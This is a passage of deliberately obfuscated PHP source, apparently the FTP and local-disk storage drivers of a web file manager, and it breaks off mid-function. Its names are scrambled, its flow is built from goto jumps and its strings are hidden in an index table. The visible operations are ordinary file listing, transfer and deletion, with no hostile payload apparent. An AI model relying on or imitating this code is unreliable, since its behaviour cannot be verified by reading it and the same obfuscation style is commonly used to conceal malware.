$this->pathFather($e‹š¼ƒ¡™‡); goto Eğñ‹¸Œ£˜; Eğñ‹¸Œ£˜: $F¼¤·§Ë® = rtrim($D¹ÍË®ÛÚÚ, $aäÈÇö´Ùç[8]) . $aäÈÇö´Ùç[8] . $b½éË£ù; $cÊšºçŒ‹É = @ftp_rename($this->connect, $e‹š¼ƒ¡™‡, $F¼¤·§Ë®); $F¼¤·§Ë® = $this->iconvApp($F¼¤·§Ë®); goto eµìÒæËí‹; aø‰¤ã¯¹Œ: } private function folderInfo($eĞ¥õñ‚Õ, $eÁÂ±ò°èà = false) { goto C¹£Íªã; d ÂªïÄì¨: return $f‰Êƒ£ø½Ó; goto EˆÆäº²šÚ; F´«ÈäíŠæ: $b…ŠŸÜ×ëÈ = $this->iconvSystem($eĞ¥õñ‚Õ); if ($eÁÂ±ò°èà) { return array($C»™Æ‘÷‹å[28] => $f¿Şƒ¬á¿Û, $C»™Æ‘÷‹å[76] => $díÈôµ—‡, $C»™Æ‘÷‹å[29] => $C»™Æ‘÷‹å[77]); } $f‰Êƒ£ø½Ó = array($C»™Æ‘÷‹å[28] => $f¿Şƒ¬á¿Û, $C»™Æ‘÷‹å[76] => $díÈôµ—‡, $C»™Æ‘÷‹å[29] => $C»™Æ‘÷‹å[77], $C»™Æ‘÷‹å[184] => $C»™Æ‘÷‹å[50], $C»™Æ‘÷‹å[106] => $C»™Æ‘÷‹å[50], $C»™Æ‘÷‹å[1120] => !0, $C»™Æ‘÷‹å[1121] => !0); goto d ÂªïÄì¨; C¹£Íªã: $C»™Æ‘÷‹å =& $_SERVER[÷ÖêïÔÔÓ]; $díÈôµ—‡ = $this->getPathOuter(rtrim($eĞ¥õñ‚Õ, $C»™Æ‘÷‹å[8])); $f¿Şƒ¬á¿Û = $this->pathThis($díÈôµ—‡); goto F´«ÈäíŠæ; EˆÆäº²šÚ: } private function fileInfo($D¡¼‹å™ï, $eöê©÷ŸÜÈ = false) { goto d©ÆÑÛ ó”; Bƒ¼»ã¶Ë: $FéÖ ßÃ—[$fåîß„ç‰[106]] = $FéÖ ßÃ—[$fåîß„ç‰[106]] > 0 ? $FéÖ ßÃ—[$fåîß„ç‰[106]] : $fåîß„ç‰[50]; return $FéÖ ßÃ—; goto AÆ‚åß¹ÔÖ; d©ÆÑÛ ó”: $fåîß„ç‰ =& $_SERVER[÷ÖêïÔÔÓ]; $CÎİÇ±  = $this->getPathOuter(rtrim($D¡¼‹å™ï, $fåîß„ç‰[8])); $E£ƒ¾ÆÏËŒ = $this->pathThis($CÎİÇ± ); goto bÉºà²ßØ–; bÉºà²ßØ–: $d—µÍ›Ú± = $this->iconvSystem($D¡¼‹å™ï); if ($eöê©÷ŸÜÈ) { return array($fåîß„ç‰[28] => $E£ƒ¾ÆÏËŒ, $fåîß„ç‰[76] => $CÎİÇ± , $fåîß„ç‰[29] => $fåîß„ç‰[164], $fåîß„ç‰[157] => $this->ext($D¡¼‹å™ï), $fåîß„ç‰[78] => $this->size($D¡¼‹å™ï)); } $FéÖ ßÃ— = array($fåîß„ç‰[28] => $E£ƒ¾ÆÏËŒ, $fåîß„ç‰[76] => $CÎİÇ± , $fåîß„ç‰[29] => $fåîß„ç‰[164], $fåîß„ç‰[184] => $fåîß„ç‰[50], $fåîß„ç‰[106] => @ftp_mdtm($this->connect, $d—µÍ›Ú±), $fåîß„ç‰[157] => $this->ext($D¡¼‹å™ï), $fåîß„ç‰[78] => $this->size($D¡¼‹å™ï), $fåîß„ç‰[1120] => !0, $fåîß„ç‰[1121] => !0); goto Bƒ¼»ã¶Ë; AÆ‚åß¹ÔÖ: } public function size($dƒÜÓÔ®ò) { $eØ²¬±¼ìÔ = $this->objectMeta($dƒÜÓÔ®ò); return $eØ²¬±¼ìÔ ? $eØ²¬±¼ìÔ[$_SERVER[÷ÖêïÔÔÓ][78]] : 0; } public function info($aš½á«…ø) { if ($this->isFile($aš½á«…ø)) { return $this->fileInfo($aš½á«…ø, 0); } else { if ($this->isFolder($aš½á«…ø)) { return $this->folderInfo($aš½á«…ø); } } return !1; } public function exist($Eˆ„£­—™ä) { return $this->objectMeta($Eˆ„£­—™ä) ? !0 : !1; } public function isFile($FÎ•¯Òï–à) { $bìãó¡Ğ× =& $_SERVER[÷ÖêïÔÔÓ]; $Aèí×¼£» = $this->objectMeta($FÎ•¯Òï–à); return $Aèí×¼£» ? $Aèí×¼£»[$bìãó¡Ğ×[29]] == $bìãó¡Ğ×[164] : !1; } public function isFolder($DÊùŒ®ß’–) { $C¯•ÀèÖÍ´ =& $_SERVER[÷ÖêïÔÔÓ]; $Bôñó¾©¾õ = $this->objectMeta($DÊùŒ®ß’–); return $Bôñó¾©¾õ ? $Bôñó¾©¾õ[$C¯•ÀèÖÍ´[29]] == $C¯•ÀèÖÍ´[77] : !1; } public function listPath($Eëœ¾×¿èÛ, $eš“ƒ‹õì• = false) { goto C»‹ë”Ü¤ˆ; C­µ©ì¼á˜: foreach ($A›ƒ¼†õ…È as $Eëœ¾×¿èÛ) { if ($this->isFolder($Eëœ¾×¿èÛ)) { $AÉù¢öÏº—[$f¾ºå‹ˆºî[75]][] = $this->folderInfo($Eëœ¾×¿èÛ, $eš“ƒ‹õì•); } else { $AÉù¢öÏº—[$f¾ºå‹ˆºî[74]][] = $this->fileInfo($Eëœ¾×¿èÛ, $eš“ƒ‹õì•); } } return $AÉù¢öÏº—; goto E±òÒŸ‡˜‹; d÷¥³–äíÂ: $A›ƒ¼†õ…È = $this->ftpList($Eëœ¾×¿èÛ); $AÉù¢öÏº— = array($f¾ºå‹ˆºî[75] => array(), $f¾ºå‹ˆºî[74] => array()); if (!$A›ƒ¼†õ…È) { return $AÉù¢öÏº—; } goto C­µ©ì¼á˜; C»‹ë”Ü¤ˆ: $f¾ºå‹ˆºî =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->_isconn()) { return !1; } $Eëœ¾×¿èÛ = $this->iconvSystem($Eëœ¾×¿èÛ); goto d÷¥³–äíÂ; E±òÒŸ‡˜‹: } public function has($f­ƒ¡¥£å¥, $cº‹·†‘»Ó = false, $F…¸„æÔŠÀ = true) { goto bŒã¤éœ›é; bŒã¤éœ›é: $CÂ­ªâ¤Ş =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->_isconn()) { return !1; } $f­ƒ¡¥£å¥ = $this->iconvSystem($f­ƒ¡¥£å¥); goto DÁâªâ¹Ã; DÁâªâ¹Ã: $A‚åß˜ËÍ÷ = $this->ftpList($f­ƒ¡¥£å¥); if (!$A‚åß˜ËÍ÷) { return !1; } if ($cº‹·†‘»Ó) { return array($CÂ­ªâ¤Ş[188] => 0, $CÂ­ªâ¤Ş[189] => count($A‚åß˜ËÍ÷)); } goto EÏóÜÏÈÕ; EÏóÜÏÈÕ: foreach ($A‚åß˜ËÍ÷ as $f­ƒ¡¥£å¥) { if ($F…¸„æÔŠÀ) { if (!$this->isFolder($f­ƒ¡¥£å¥)) { return !0; } } else { if ($this->isFolder($f­ƒ¡¥£å¥)) { return !0; } } } return !1; goto f´¨Ï¾œöš; f´¨Ï¾œöš: } public function listAll($bÁÎæÇœª§) { goto Cô†à—Ìƒ; AÁÀÌ´©›: $d—ò§•”°¸ = array($dÒ„™î°«[74] => array(), $dÒ„™î°«[75] => array()); $this->recursionFtpFiles($bÁÎæÇœª§, $d—ò§•”°¸); $C”Á™‘ğâä = array(); goto c–åÎµÓ„ğ; c–åÎµÓ„ğ: foreach ($d—ò§•”°¸[$dÒ„™î°«[75]] as $d™ø‚Œ’ä«) { $C”Á™‘ğâä[] = array($dÒ„™î°«[76] => $dÒ„™î°«[8] . trim(str_replace($bÁÎæÇœª§, $dÒ„™î°«[33], $d™ø‚Œ’ä«), $dÒ„™î°«[8]) . $dÒ„™î°«[8], $dÒ„™î°«[77] => 1, $dÒ„™î°«[78] => 0); } foreach ($d—ò§•”°¸[$dÒ„™î°«[74]] as $f…›ˆìÊÂ‹) { $C”Á™‘ğâä[] = array($dÒ„™î°«[76] => $dÒ„™î°«[8] . trim(str_replace($bÁÎæÇœª§, $dÒ„™î°«[33], $f…›ˆìÊÂ‹), $dÒ„™î°«[8]), $dÒ„™î°«[77] => 0, $dÒ„™î°«[78] => $this->size($f…›ˆìÊÂ‹)); } return $C”Á™‘ğâä; goto Bà¶‰’®Ü; Cô†à—Ìƒ: $dÒ„™î°« =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->_isconn()) { return !1; } $bÁÎæÇœª§ = $this->iconvSystem($bÁÎæÇœª§); goto AÁÀÌ´©›; Bà¶‰’®Ü: } public function getContent($F®©¦èÚ¥Ğ) { if (!$this->_isconn()) { return !1; } $F®©¦èÚ¥Ğ = $this->iconvSystem($F®©¦èÚ¥Ğ); return $this->fileSubstr($F®©¦èÚ¥Ğ); } public function setContent($A¬ó¤ß“è©, $Eµôã‚ğØí = '') { goto d¿ôÚ¬Ã§á; d¿ôÚ¬Ã§á: if (!$this->_isconn()) { return !1; } $CÊİ‹ŸÉ = $this->pathThis($this->iconvSystem($A¬ó¤ß“è©)); $Eè¥Š³ÇÃÆ = $this->tempFile($CÊİ‹ŸÉ); goto cºç†ˆÛä; D±ŠøßÌ¯: return $béß®ÚÜ¿; goto E“Ø¾ïâ‡Ÿ; cºç†ˆÛä: file_put_contents($Eè¥Š³ÇÃÆ, $Eµôã‚ğØí); $béß®ÚÜ¿ = $this->upload($A¬ó¤ß“è©, $this->iconvApp($Eè¥Š³ÇÃÆ)); $this->tempFileRemve($Eè¥Š³ÇÃÆ); goto D±ŠøßÌ¯; E“Ø¾ïâ‡Ÿ: } public function fileSubstr($D°ìƒ¯š‡, $fÅ²Òô¤– = 0, $bï„®…˜ºó = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($D°ìƒ¯š‡, $fÅ²Òô¤–, $bï„®…˜ºó); } private function ftpRequest($AíĞ¥Âò, $b«®¶éá¹ = 0, $A–ĞÒàŞß = false) { goto fÉ§‡í°¤; Eê“å’ùë: curl_setopt($FÔ³²Á¿Ö , CURLOPT_URL, $FïöóùªÄ£ . $this->pathEncode($AíĞ¥Âò)); curl_setopt($FÔ³²Á¿Ö , CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($A–ĞÒàŞß) { $Aï´›‹¹ƒ = $b«®¶éá¹ + $A–ĞÒàŞß - 1; curl_setopt($FÔ³²Á¿Ö , CURLOPT_RANGE, "{$b«®¶éá¹}\x2d{$Aï´›‹¹ƒ}"); } goto FßÃõ‹»ëå; FßÃõ‹»ëå: curl_setopt($FÔ³²Á¿Ö , CURLOPT_RETURNTRANSFER, 1); $c‡´¶À§Ø = curl_exec($FÔ³²Á¿Ö ); curl_close($FÔ³²Á¿Ö ); goto F²—é¢²Á‘; F²—é¢²Á‘: return $c‡´¶À§Ø; goto eïô­øÊºÙ; fÉ§‡í°¤: $AíĞ¥Âò = $this->iconvSystem($AíĞ¥Âò); $FïöóùªÄ£ = $this->scheme . $this->host . $_SERVER[÷ÖêïÔÔÓ][4] . $this->port; $FÔ³²Á¿Ö  = curl_init(); goto Eê“å’ùë; eïô­øÊºÙ: } public function upload($bïÓâô“š×, $fº±Æ¬´¨Õ, $f‡ëà“¥Åå = false, $eÛ†š±Ëµõ = REPEAT_REPLACE) { goto e²Ãê Æôò; D»„Ãê×‰°: if ($FĞùø¯§  != FTP_FINISHED) { return !1; } return $this->getPathOuter($bïÓâô“š×); goto FÏ§¯ŞÛ›˜; e²Ãê Æôò: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($bïÓâô“š×))) { return !1; } $bïÓâô“š× = $this->iconvSystem($bïÓâô“š×); goto dÏï‡‰é£ƒ; dÏï‡‰é£ƒ: $fº±Æ¬´¨Õ = $this->iconvSystem($fº±Æ¬´¨Õ); $FĞùø¯§  = ftp_nb_put($this->connect, $bïÓâô“š×, $fº±Æ¬´¨Õ, FTP_BINARY); while ($FĞùø¯§  == FTP_MOREDATA) { $FĞùø¯§  = ftp_nb_continue($this->connect); } goto D»„Ãê×‰°; FÏ§¯ŞÛ›˜: } public function download($F¡½¤»çªŒ, $FÊ„äˆ‰† = '') { goto CÌºÍËÌ±ø; CÌºÍËÌ±ø: if (!$this->_isconn()) { return !1; } $DÜ»ø­°²” = $this->pathFather($FÊ„äˆ‰†); if (!IO::mkdir($DÜ»ø­°²”)) { return !1; } goto FÃ¾è±–ÂÈ; FÃ¾è±–ÂÈ: $F¡½¤»çªŒ = $this->iconvSystem($F¡½¤»çªŒ); $FÊ„äˆ‰† = $this->iconvSystem($FÊ„äˆ‰†); $E¯„´Îâ = ftp_nb_get($this->connect, $FÊ„äˆ‰†, $F¡½¤»çªŒ, FTP_BINARY); goto fâÒÂãâ»ã; fâÒÂãâ»ã: while ($E¯„´Îâ == FTP_MOREDATA) { $E¯„´Îâ = ftp_nb_continue($this->connect); } if ($E¯„´Îâ != FTP_FINISHED) { return !1; } return $this->iconvApp($FÊ„äˆ‰†); goto E˜Çœ™Çª; E˜Çœ™Çª: } private function ftpList($cÏ’¼òØÍ) { goto e×˜Íˆ²‡¥; e×˜Íˆ²‡¥: $EÖÉ’òª“ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->isFolder($cÏ’¼òØÍ)) { return !1; } @ftp_chdir($this->connect, $EÖÉ’òª“[8]); goto A»Â‹ˆ¤«õ; aù½çˆøÇ¬: $e…õïèÊï¼ = array(); foreach ($E‰Í¾åçˆ· as $f¹å‡×øÇ) { if ($f¹å‡×øÇ == $EÖÉ’òª“[92] || $f¹å‡×øÇ == $EÖÉ’òª“[1123]) { continue; } if (!strstr($f¹å‡×øÇ, $EÖÉ’òª“[8])) { $f¹å‡×øÇ = $cÏ’¼òØÍ . ltrim($f¹å‡×øÇ, $EÖÉ’òª“[8]); } $e…õïèÊï¼[] = $this->iconvApp($f¹å‡×øÇ); } return $e…õïèÊï¼; goto B³Ù‰–“ÌŠ; A»Â‹ˆ¤«õ: $cÏ’¼òØÍ = rtrim($cÏ’¼òØÍ, $EÖÉ’òª“[8]) . $EÖÉ’òª“[8]; $E‰Í¾åçˆ· = @ftp_nlist($this->connect, $cÏ’¼òØÍ); if ($E‰Í¾åçˆ· === !1) { $E‰Í¾åçˆ· = @ftp_rawlist($this->connect, $cÏ’¼òØÍ); foreach ($E‰Í¾åçˆ· as $d¬óÄÆÁ© => $F„äƒ‚ÖÄä) { $E‰Í¾åçˆ·[$d¬óÄÆÁ©] = end(explode($EÖÉ’òª“[1122], $F„äƒ‚ÖÄä)); } } goto aù½çˆøÇ¬; B³Ù‰–“ÌŠ: } private function recursionFtpFiles($B¥í×ÇÇËÊ, &$cÜŠ‰¶Š¯Å) { $Eƒ­ò¡äÏ´ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->_isconn()) { return !1; } if (!($AÏÈÄÊ©Í´ = $this->ftpList($B¥í×ÇÇËÊ))) { return !1; } foreach ($AÏÈÄÊ©Í´ as $B¥í×ÇÇËÊ) { if ($this->isFolder($B¥í×ÇÇËÊ)) { $this->recursionFtpFiles($B¥í×ÇÇËÊ, $cÜŠ‰¶Š¯Å); $cÜŠ‰¶Š¯Å[$Eƒ­ò¡äÏ´[75]][] = $B¥í×ÇÇËÊ; } else { $cÜŠ‰¶Š¯Å[$Eƒ­ò¡äÏ´[74]][] = $B¥í×ÇÇËÊ; } } } private function objectMeta($A«²ˆ½‹Ï) { goto BŠñ¯‚šØ‚; Eù«’‰ôĞ: return $Cœá¾¾”ç; goto F¿«—¨‡‚Ø; BĞÖùæªˆ: if ($Cœá¾¾”ç !== null && $Cœá¾¾”ç !== !1) { return $Cœá¾¾”ç; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $A¬é‡¾£Ÿ[8]); goto dñ‚òß‚ÜŒ; BŠñ¯‚šØ‚: $A¬é‡¾£Ÿ =& $_SERVER[÷ÖêïÔÔÓ]; $fæ”«Û˜ù = $A¬é‡¾£Ÿ[1124] . md5($A«²ˆ½‹Ï); $Cœá¾¾”ç = Cache::get($fæ”«Û˜ù); goto BĞÖùæªˆ; dñ‚òß‚ÜŒ: $CÂè¢Ô“‹ = @ftp_size($this->connect, $this->iconvSystem($A«²ˆ½‹Ï)); if ($CÂè¢Ô“‹ != -1) { $Cœá¾¾”ç = array($A¬é‡¾£Ÿ[78] => $CÂè¢Ô“‹, $A¬é‡¾£Ÿ[29] => $A¬é‡¾£Ÿ[164]); } else { $D‘í»«ß Ô = @ftp_chdir($this->connect, $this->iconvSystem($A«²ˆ½‹Ï)); $Cœá¾¾”ç = $D‘í»«ß Ô ? array($A¬é‡¾£Ÿ[78] => 0, $A¬é‡¾£Ÿ[29] => $A¬é‡¾£Ÿ[77]) : !1; } Cache::set($fæ”«Û˜ù, $Cœá¾¾”ç, 0); goto Eù«’‰ôĞ; F¿«—¨‡‚Ø: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($FÖ«¾†À°Å) { if (substr($FÖ«¾†À°Å, 0, 2) == $_SERVER[÷ÖêïÔÔÓ][1113]) { $FÖ«¾†À°Å = BASIC_PATH . substr($FÖ«¾†À°Å, 2); } return $FÖ«¾†À°Å; } public function iconvApp($b÷ß×Ó“ˆ‹) { $e‰¨•‘Ñ =& $_SERVER[÷ÖêïÔÔÓ]; global $config; return $this->iconvTo($b÷ß×Ó“ˆ‹, $config[$e‰¨•‘Ñ[1111]], $config[$e‰¨•‘Ñ[1110]]); } public function iconvSystem($d‰ªáÂ«š¿) { $d´Ğ’Ê¥Ãî =& $_SERVER[÷ÖêïÔÔÓ]; global $config; return $this->iconvTo($d‰ªáÂ«š¿, $config[$d´Ğ’Ê¥Ãî[1110]], $config[$d´Ğ’Ê¥Ãî[1111]]); } public function getPathOuter($aë²—¤®ÀÛ) { goto a­ÃËøğê; f›äáğ‰îÖ: if (substr($a•¹ÏË¥õ”, 0, 2) == $b¥‡·ƒ•Ë›[1113]) { $a•¹ÏË¥õ” = BASIC_PATH . substr($a•¹ÏË¥õ”, 2); } if (substr($aë²—¤®ÀÛ, 0, 2) == $b¥‡·ƒ•Ë›[1113]) { $aë²—¤®ÀÛ = BASIC_PATH . substr($aë²—¤®ÀÛ, 2); } $a•¹ÏË¥õ” = KodIO::clear($a•¹ÏË¥õ”); goto Dó²èÈÌ‰; Dó²èÈÌ‰: $aë²—¤®ÀÛ = KodIO::clear($aë²—¤®ÀÛ); $aë²—¤®ÀÛ = substr($aë²—¤®ÀÛ, strlen($a•¹ÏË¥õ”)); if (empty($this->pathDriver)) { return $aë²—¤®ÀÛ; } goto F†ŠÅÔùƒê; F†ŠÅÔùƒê: return $this->pathDriver . $b¥‡·ƒ•Ë›[8] . ltrim($aë²—¤®ÀÛ, $b¥‡·ƒ•Ë›[8]); goto F‘ÀĞ·•Ğğ; a­ÃËøğê: $b¥‡·ƒ•Ë› =& $_SERVER[÷ÖêïÔÔÓ]; $a•¹ÏË¥õ” = $this->iconvApp($this->pathBase); $aë²—¤®ÀÛ = $this->iconvApp($aë²—¤®ÀÛ); goto f›äáğ‰îÖ; F‘ÀĞ·•Ğğ: } public function mkfile($cøøŞ°™ù¼, $B»éŞÍ…¯¡ = '', $dğù¶Ä“ø¥ = REPEAT_RENAME) { $cøøŞ°™ù¼ = $this->iconvSystem($cøøŞ°™ù¼); @touch($cøøŞ°™ù¼); if ($B»éŞÍ…¯¡) { file_put_contents($cøøŞ°™ù¼, $B»éŞÍ…¯¡); } return is_file($cøøŞ°™ù¼) ? $this->getPathOuter($cøøŞ°™ù¼) : !1; } public function mkdir($F¥¤…ÓŞ·, $DŞ—ç‚ƒ†® = REPEAT_SKIP) { $F¥¤…ÓŞ· = $this->iconvSystem($F¥¤…ÓŞ·); if (is_dir($F¥¤…ÓŞ·)) { return $this->getPathOuter($F¥¤…ÓŞ·); } @mkdir($F¥¤…ÓŞ·, 511, !0); return is_dir($F¥¤…ÓŞ·) ? $this->getPathOuter($F¥¤…ÓŞ·) : !1; } public function copyFile($EÄë§Ò°Ã, $A†šŠ÷’ù˜) { $this->mkdir($this->pathFather($A†šŠ÷’ù˜)); $EÄë§Ò°Ã = $this->iconvSystem($EÄë§Ò°Ã); $A†šŠ÷’ù˜ = $this->iconvSystem($A†šŠ÷’ù˜); $EíÀé‘åÎ = @copy($EÄë§Ò°Ã, $A†šŠ÷’ù˜); return $EíÀé‘åÎ ? $this->getPathOuter($A†šŠ÷’ù˜) : !1; } public function moveFile($a»§†İÒÔ, $AÛÂËÚõ¾) { $this->mkdir($this->pathFather($AÛÂËÚõ¾)); $a»§†İÒÔ = $this->iconvSystem($a»§†İÒÔ); $AÛÂËÚõ¾ = $this->iconvSystem($AÛÂËÚõ¾); $aâö¯ÇŒ“ï = intval(@rename($a»§†İÒÔ, $AÛÂËÚõ¾)); if (!$aâö¯ÇŒ“ï) { if ($aâö¯ÇŒ“ï = intval(@copy($a»§†İÒÔ, $AÛÂËÚõ¾))) { @unlink($a»§†İÒÔ); } } return $aâö¯ÇŒ“ï ? $this->getPathOuter($AÛÂËÚõ¾) : !1; } public function delFile($dÂ¯²ñœ…) { $dÂ¯²ñœ… = $this->iconvSystem($dÂ¯²ñœ…); if (!@unlink($dÂ¯²ñœ…)) { @chmod($dÂ¯²ñœ…, 511); if (!@unlink($dÂ¯²ñœ…)) { return !1; } } else { return !0; } } public function delFolder($e®Ş½¨È—¿) { goto b”ï¦åˆŸ‰; bî³ë™›: return rmdir($e®Ş½¨È—¿); goto DßàÀÂ‚½ç; A’à‰»ÄŸ: if (!($e˜­›‡Ø» = opendir($e®Ş½¨È—¿))) { return !1; } while (($aï–Ç‚°Í— = readdir($e˜­›‡Ø»)) !== !1) { if ($aï–Ç‚°Í— == $b¹®ÏÏ…å£[92] || $aï–Ç‚°Í— == $b¹®ÏÏ…å£[1123]) { continue; } $Cƒ©‹óØ…² = $e®Ş½¨È—¿ . $b¹®ÏÏ…å£[8] . $aï–Ç‚°Í—; if (!is_dir($Cƒ©‹óØ…²)) { if (!unlink($Cƒ©‹óØ…²)) { chmod($Cƒ©‹óØ…², 511); if (!unlink($Cƒ©‹óØ…²)) { return !1; } } } else { chmod($Cƒ©‹óØ…², 511); $Cƒ©‹óØ…² = $this->iconvApp($Cƒ©‹óØ…²); if (!$this->delFolder($Cƒ©‹óØ…²)) { return !1; } } } closedir($e˜­›‡Ø»); goto bî³ë™›; b”ï¦åˆŸ‰: $b¹®ÏÏ…å£ =& $_SERVER[÷ÖêïÔÔÓ]; $e®Ş½¨È—¿ = $this->iconvSystem($e®Ş½¨È—¿); if (!is_dir($e®Ş½¨È—¿)) { return !0; } goto A’à‰»ÄŸ; DßàÀÂ‚½ç: } public function rename($fíÍğ÷íù, $A·çÚ…Ô—) { goto cçÇ£¤áÔœ; cÄ¢Äåªµ : $B‹œÖôŞŠÜ = @rename($fíÍğ÷íù, $fºÃ™‚—„ß); $fºÃ™‚—„ß = $this->iconvApp($fºÃ™‚—„ß); return $B‹œÖôŞŠÜ ? $this->getPathOuter($fºÃ™‚—„ß) : !1; goto e–õµèõ†; béÀÕ»Éâ: $fíÍğ÷íù = $this->iconvSystem($fíÍğ÷íù); $B¹ï³ŒÍ…È = $this->pathFather($fíÍğ÷íù); $fºÃ™‚—„ß = rtrim($B¹ï³ŒÍ…È, $aîò‡—»®[8]) . $aîò‡—»®[8] . $e§­’‹÷õ; goto cÄ¢Äåªµ ; cçÇ£¤áÔœ: $aîò‡—»® =& $_SERVER[÷ÖêïÔÔÓ]; $e§­’‹÷õ = $this->fileNameAuto($this->pathFather($fíÍğ÷íù), $A·çÚ…Ô—); $e§­’‹÷õ = $this->iconvSystem($e§­’‹÷õ); goto béÀÕ»Éâ; e–õµèõ†: } public function size($fŒìˆãÆï¯) { $fŒìˆãÆï¯ = $this->iconvSystem($fŒìˆãÆï¯); return (double) abs(sprintf($_SERVER[÷ÖêïÔÔÓ][1125], @filesize($fŒìˆãÆï¯))); } public function info($CÕÕ«ÂÌÜç) { $CÕÕ«ÂÌÜç = $this->iconvSystem($CÕÕ«ÂÌÜç); if ($this->isFolder($CÕÕ«ÂÌÜç)) { return $this->folderInfo($CÕÕ«ÂÌÜç); } else { if ($this->isFile($CÕÕ«ÂÌÜç)) { return $this->fileInfo($CÕÕ«ÂÌÜç); } } return !1; } protected function infoChildren($f°šç¼…, &$E¡ìŞ¾À©õ, $Aæ¥Õ³Ø¿  = true) { $D‘–’ŠšÒ =& $_SERVER[÷ÖêïÔÔÓ]; $f°šç¼… = rtrim($f°šç¼…, $D‘–’ŠšÒ[8]) . $D‘–’ŠšÒ[8]; if ($Aæ¥Õ³Ø¿ ) { check_abort(); $f°šç¼… = $this->iconvSystem($f°šç¼…); } if (!($d¤‡ù´òÑÒ = @opendir($f°šç¼…))) { return; } while (($CåĞ¦¤Ğ‚¿ = readdir($d¤‡ù´òÑÒ)) !== !1) { if ($CåĞ¦¤Ğ‚¿ == $D‘–’ŠšÒ[92] || $CåĞ¦¤Ğ‚¿ == $D‘–’ŠšÒ[1123]) { continue; } $eÁ·ÖˆÍŒï = $f°šç¼… . $CåĞ¦¤Ğ‚¿; if (is_file($eÁ·ÖˆÍŒï)) { $E¡ìŞ¾À©õ[$D‘–’ŠšÒ[79]]++; $E¡ìŞ¾À©õ[$D‘–’ŠšÒ[78]] += (double) abs(sprintf($D‘–’ŠšÒ[1125], @filesize($eÁ·ÖˆÍŒï))); } else { $E¡ìŞ¾À©õ[$D‘–’ŠšÒ[80]]++; $this->infoChildren($eÁ·ÖˆÍŒï, $E¡ìŞ¾À©õ, !1); } } closedir($d¤‡ù´òÑÒ); } private function folderInfo($f›ë¤Âô‘¿, $dá²“”Í¼Ö = false) { $AŞƒ¨Ò”ó­ =& $_SERVER[÷ÖêïÔÔÓ]; $f›ë¤Âô‘¿ = rtrim($f›ë¤Âô‘¿, $AŞƒ¨Ò”ó­[8]) . $AŞƒ¨Ò”ó­[8]; $f†ÜèÒ¶Ô£ = $this->iconvApp($this->pathThis($f›ë¤Âô‘¿)); if ($dá²“”Í¼Ö) { return array($AŞƒ¨Ò”ó­[28] => $f†ÜèÒ¶Ô£, $AŞƒ¨Ò”ó­[76] => $this->getPathOuter($f›ë¤Âô‘¿), $AŞƒ¨Ò”ó­[29] => $AŞƒ¨Ò”ó­[77]); } $dÑ“İˆ‹º = array($AŞƒ¨Ò”ó­[28] => $f†ÜèÒ¶Ô£, $AŞƒ¨Ò”ó­[76] => $this->getPathOuter($f›ë¤Âô‘¿), $AŞƒ¨Ò”ó­[29] => $AŞƒ¨Ò”ó­[77], $AŞƒ¨Ò”ó­[184] => @filectime($f›ë¤Âô‘¿), $AŞƒ¨Ò”ó­[106] => @filemtime($f›ë¤Âô‘¿), $AŞƒ¨Ò”ó­[1126] => @fileatime($f›ë¤Âô‘¿), $AŞƒ¨Ò”ó­[1120] => is_readable($f›ë¤Âô‘¿), $AŞƒ¨Ò”ó­[1121] => is_writable($f›ë¤Âô‘¿), $AŞƒ¨Ò”ó­[1127] => get_mode($f›ë¤Âô‘¿)); return $dÑ“İˆ‹º; } private function fileInfo($aõ‡³¹½Ê´, $aÌêñ…§ = false) { $A™ÖÈÄÓ¤ô =& $_SERVER[÷ÖêïÔÔÓ]; $fáµÆŞÜÚ = $this->iconvApp($this->pathThis($aõ‡³¹½Ê´)); if ($aÌêñ…§) { return array($A™ÖÈÄÓ¤ô[28] => $fáµÆŞÜÚ, $A™ÖÈÄÓ¤ô[76] => $this->getPathOuter($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[29] => $A™ÖÈÄÓ¤ô[164], $A™ÖÈÄÓ¤ô[78] => $this->size($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[157] => $this->ext($fáµÆŞÜÚ)); } $Féöõ–²ŠÖ = array($A™ÖÈÄÓ¤ô[28] => $fáµÆŞÜÚ, $A™ÖÈÄÓ¤ô[76] => $this->getPathOuter($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[29] => $A™ÖÈÄÓ¤ô[164], $A™ÖÈÄÓ¤ô[184] => @filectime($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[106] => @filemtime($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[1126] => @fileatime($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[78] => $this->size($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[157] => $this->ext($fáµÆŞÜÚ), $A™ÖÈÄÓ¤ô[1120] => is_readable($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[1121] => is_writable($aõ‡³¹½Ê´), $A™ÖÈÄÓ¤ô[1127] => get_mode($aõ‡³¹½Ê´)); return $Féöõ–²ŠÖ; } public function exist($f™“¢°ãëá) { $f™“¢°ãëá = $this->iconvSystem($f™“¢°ãëá); return @file_exists($f™“¢°ãëá); } public function isFile($dòÙ¢ÒÊ¨×) { $dòÙ¢ÒÊ¨× = $this->iconvSystem($dòÙ¢ÒÊ¨×); return @is_file($dòÙ¢ÒÊ¨×); } public function isFolder($E–ª²À ô») { $E–ª²À ô» = $this->iconvSystem($E–ª²À ô»); return @is_dir($E–ª²À ô»); } public function listPath($F¶ğ®Ö÷±È, $A°˜øšñÈ = false) { goto B¬á¸˜¶º¼; B¬á¸˜¶º¼: $föß¯™Õë =& $_SERVER[÷ÖêïÔÔÓ]; $F¶ğ®Ö÷±È = $this->iconvSystem($F¶ğ®Ö÷±È); $F¶ğ®Ö÷±È = rtrim($F¶ğ®Ö÷±È, $föß¯™Õë[8]) . $föß¯™Õë[8]; goto DÜÃƒÈä; DÜÃƒÈä: $D†ÔË¢º• = array($föß¯™Õë[75] => array(), $föß¯™Õë[74] => array()); if 